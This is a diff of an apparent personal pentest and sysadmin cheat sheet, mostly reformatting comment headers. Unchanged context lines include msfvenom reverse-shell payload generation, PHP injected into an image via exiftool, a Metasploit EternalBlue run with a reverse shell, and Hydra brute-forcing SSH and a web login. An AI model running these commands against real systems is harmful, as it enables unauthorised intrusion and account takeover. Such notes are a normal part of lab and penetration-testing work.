@@ -8,7 +8,7 @@
  
  https://gist.github.com  
 
- // Payloads with msfvenom - Linux
+// Payloads with msfvenom - Linux
 
      msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o shellcode.bin  
      msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip of multi/handler> LPORT=4444 -f raw -o evil.php  
@@ -16,8 +16,14 @@
 // PHP payload with Exiftool - Linux  
 
     exiftool -Comment='<?php phpinfo(); ?>' ./street-cat.jpg  
+    
+// Strip metadata with Exiftool - Linux  
+
+```
+exiftool -All= image.jpg
+```
      
- // Metasploit - Linux  
+// Metasploit - Linux  
  
      msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;setg RHOSTS $IP;setg LHOST tun0;run"  
      msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;set payload windows/x64/shell/reverse_tcp;setg RHOSTS $IP;setg LHOST tun0;run"  
@@ -27,92 +33,92 @@
      search shell_to_meterpreter  
      search php/meterpreter/reverse_tcp  
  
- // Find processes running on a port - Windows  
+// Find processes running on a port - Windows  
  
      netstat -ano | findstr <port_number> 
     
- // Get info of process - Windows  
+// Get info of process - Windows  
  
      tasklist /FI "PID eq <process_id>"  
      
- // Get location of process - Windows  
+// Get location of process - Windows  
  
      wmic process where ProcessId=<process_id> get ExecutablePath
  
- // List domain users - Windows  
+// List domain users - Windows  
  
      net user /domain
  
- // Find SMB shares on Windows host - Linux  
+// Find SMB shares on Windows host - Linux  
  
      smbclient -L <hostname or ip> -U <domain/user>
      
- // Connect to SMB share on Windows host - Linux  
+// Connect to SMB share on Windows host - Linux  
  
      smbclient //<hostname or ip>/Foo$ -U <domain/user>  
 
- // Recursively download SMB share - Linux  
+// Recursively download SMB share - Linux  
 
      smbget -R smb://<hostname>/anonymous
      
- // Mount SMB share - Linux  
+// Mount SMB share - Linux  
  
      mount -t cifs //<remote_host>/<share_name> ~/mnt/share -o username=<username>
  
- // Find Apple Developer Certificate - MacOS  
+// Find Apple Developer Certificate - MacOS  
  
      security find-identity -v -p codesigning
  
- // Sign file with Developer Certificate - MacOS
+// Sign file with Developer Certificate - MacOS
  
      codesign -s "Apple Development: <Name> (<XXXXXXXXXX>)" foo.dylib
      
- // Build Dynamic Library - GoLang
+// Build Dynamic Library - GoLang
  
      go build -o foo.dylib -buildmode=c-shared -ldflags "-linkmode=external -w" foo.go  
      
- // Build Dynamic Library - C  
+// Build Dynamic Library - C  
  
      gcc -dynamiclib foo.c -o foo.dylib  
  
- // Strip symbols from build process - GoLang
+// Strip symbols from build process - GoLang
  
      go build -ldflags="-s -w" foo.go  
 
- // Compile with all libraries necessary - GoLang  
+// Compile with all libraries necessary - GoLang  
  
      GOARCH=amd64 GOOS=linux CGO_ENABLED=0 go build -o go-gobserver  
 
- // Initiate module for project - GoLang  
+// Initiate module for project - GoLang  
  
      go mod init foo  
      
- // Set primary and secondary DNS - Windows
+// Set primary and secondary DNS - Windows
  
      Get-NetAdapter  
      Set-DnsClientServerAddress -InterfaceIndex <Interface Number> -ServerAddresses ("8.8.8.8","8.8.4.4")  
      
- // Join to domain - Windows
+// Join to domain - Windows
  
      Add-Computer -DomainName <domain name>
      
- // Get current domain - Windows
+// Get current domain - Windows
  
      (Get-WmiObject Win32_ComputerSystem).Domain
 
- // Network connections - Windows
+// Network connections - Windows
  
      ncpa.cpl  
 
- // User Management - Wind0ze  
+// User Management - Wind0ze  
 
      lusrmgr  
      
- // Advanced Rename / User account removal - Windows
+// Advanced Rename / User account removal - Windows
  
      sysdm.cpl  
  
- // Linux command equivalents - Windows
+// Linux command equivalents - Windows
 
     copy
     where /r c:\ foo.bar
@@ -120,50 +126,50 @@
     type > foo.bar
     net start foo
  
- // Change NIC mac address - Windows  
+// Change NIC mac address - Windows  
  
      Get-NetAdapter
      Set-NetAdapter -Name "<Adapter name>" -MacAddress "<New MAC address>"  
      
- // Change NIC mac address - Linux
+// Change NIC mac address - Linux
 
     sudo ip link show
     sudo ip link set <interface> down
     sudo ip link set <interface> address <new MAC address>
     sudo ip link set <interface> up
 
- // Change NIC mac address - MacOS
+// Change NIC mac address - MacOS
 
     ifconfig
     sudo ifconfig <interface> down
     sudo ifconfig <interface> hw ether <new MAC address>
     sudo ifconfig <interface> up
  
- // Clear derived data for Xcode - MacOS  
+// Clear derived data for Xcode - MacOS  
  
      rm -rf ~/Library/Developer/Xcode/DerivedData/*  
      
- // Firefox for Windows: 
+// Firefox for Windows: 
  
     curl -L -o firefox-latest.exe "https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=en-US"  
     
- // Windows key from firmware/BIOS - Linux 
+// Windows key from firmware/BIOS - Linux 
 
     sudo strings /sys/firmware/acpi/tables/MSDM
     
- // Windows key from Registry - Windows 11
+// Windows key from Registry - Windows 11
 
     Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ClipSVC\"
 
- // Windows key from Registry - Windows 10  
+// Windows key from Registry - Windows 10  
  
     Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform"
 
- // Add current user to vboxusers group - Linux
+// Add current user to vboxusers group - Linux
 
     sudo usermod -a -G vboxusers $USER
 
- // DefectDojo Setup - Debian  
+// DefectDojo Setup - Debian  
 
     git clone https://github.com/DefectDojo/django-DefectDojo &&  cd django-DefectDojo
     sudo apt install docker-compose
@@ -171,7 +177,7 @@
     sudo ./dc-up.sh postgres-redis 
     docker-compose logs initializer | grep "Admin password:"
 
- // OpenVAS Setup - Debian
+// OpenVAS Setup - Debian
     
     sudo apt install openvas nsis postgresql
     sudo service postgresql start
@@ -192,7 +198,7 @@
     sudo gvm-start
     sudo gvm-setup  
     
- // Connect to Ethernet - Linux
+// Connect to Ethernet - Linux
 
     ip link list
     ip link set <interface> up
@@ -205,7 +211,7 @@
     station wlan0 get-networks
     station wlan0 connect "<Network ESSID>"
     
- // Connect to wireless Method 2 - Linux
+// Connect to wireless Method 2 - Linux
      
     iwconfig
     sudo ifconfig <INTERFACE> up
@@ -216,7 +222,7 @@
     sudo iwconfig essid <ESSID>
     sudo dhclient wlp3s0
 
- // Check hash - Windows  
+// Check hash - Windows  
  
     CertUtil -hashfile filename MD5
     CertUtil -hashfile filename SHA256
@@ -236,15 +242,15 @@
      sudo curl -so /etc/apt/trusted.gpg.d/oxen.gpg https://deb.oxen.io/pub.gpg  
      echo "deb https://deb.oxen.io $(lsb_release -sc) main" | sudo tee /etc/apt/sources.list.d/oxen.list 
 
- // Right-Click context menu - Windows 11  
+// Right-Click context menu - Windows 11  
  
      reg add "HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32" /f /ve
     
- // Unzip a disc image - Linux
+// Unzip a disc image - Linux
  
      unxz -v <Path to image>.img.xz  
 
- // VMware - Linux "Cannot open /dev/vmmon: No such file or directory"  
+// VMware - Linux "Cannot open /dev/vmmon: No such file or directory"  
  
 Generate key pair using openssl for VMware:  
 
@@ -380,7 +386,7 @@ ls -l /usr/share/nmap/scripts/*smb*
 Download script:
 sudo wget -O /usr/share/nmap/scripts/<script-name>.nse https://svn.nmap.org/nmap/scripts/<script-name>.nse  
 
- // Hydra  
+// Hydra  
 
  SSH  
 
@@ -390,7 +396,7 @@ Web Portal
 
      hydra -l <username> -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt <hostname> http-post-form "/admin/login/:username=^USER^&password=^PASS^:F=incorrect" -V  
 
- // Tshark filters  
+// Tshark filters  
 
     tshark -r dnsexfil.pcap -Y "!(ip.src == 192.168.1.200) && !(tcp.analysis.retransmission || tcp.analysis.flags && tcp.flags.reset)" -T fields -e dns.qry.name  
 
@@ -400,7 +406,7 @@ Web Portal
 
     tshark -r dns.cap -Y "dns.qry.type == 1" -T fields -e dns.qry.name 
      
- // Links  
+// Links  
 
 TCP/IP RFC 9293  
 https://www.rfc-editor.org/rfc/rfc9293
@@ -453,7 +459,7 @@ https://hipsum.co/
 <table bordercolor="#77a6fd">
   <tr>
     <td width="50%" valign="top">
-      <h3 align="center">Polaroid humblebrag</h3>
+      <h3 align="center">Sample 1</h3>
         <br />
         <a href="https://hipsum.co" target="_blank" >
             <img src="https://github.com/timsonner/github-profile-markdown-snippets/blob/main/golden-ratio-filler.jpg"/>
@@ -471,7 +477,7 @@ https://hipsum.co/
         <p><strong>Hipster/Ipsum</strong> - Four dollar toast meditation actually deep v, microdosing chicharrones pug coloring book direct trade. Skateboard thundercats before they sold out.</p>
     </td>
     <td width="50%" valign="top">
-      <h3 align="center">Polaroid humblebrag</h3>
+      <h3 align="center">Example 2</h3>
         <br />
         <a href="https://hipsum.co" target="_blank" >
             <img src="https://github.com/timsonner/github-profile-markdown-snippets/blob/main/golden-ratio-filler.jpg"/>
@@ -491,7 +497,7 @@ https://hipsum.co/
   </tr>
   
   <td width="50%" valign="top">
-      <h3 align="center">Polaroid humblebrag</h3>
+      <h3 align="center">Project 3</h3>
         <br />
         <a href="https://hipsum.co" target="_blank" >
             <img src="https://github.com/timsonner/github-profile-markdown-snippets/blob/main/golden-ratio-filler.jpg"/>
@@ -509,7 +515,7 @@ https://hipsum.co/
         <p><strong>Wowowow</strong> - Four dollar toast meditation actually deep v, microdosing chicharrones pug coloring book direct trade. Skateboard thundercats before they sold out.</p>
     </td>
    <td width="50%" valign="top">
-      <h3 align="center">Polaroid humblebrag</h3>
+      <h3 align="center">Specimen 4</h3>
         <br />
         <a href="https://hipsum.co" target="_blank" >
             <img src="https://github.com/timsonner/github-profile-markdown-snippets/blob/main/golden-ratio-filler.jpg"/>
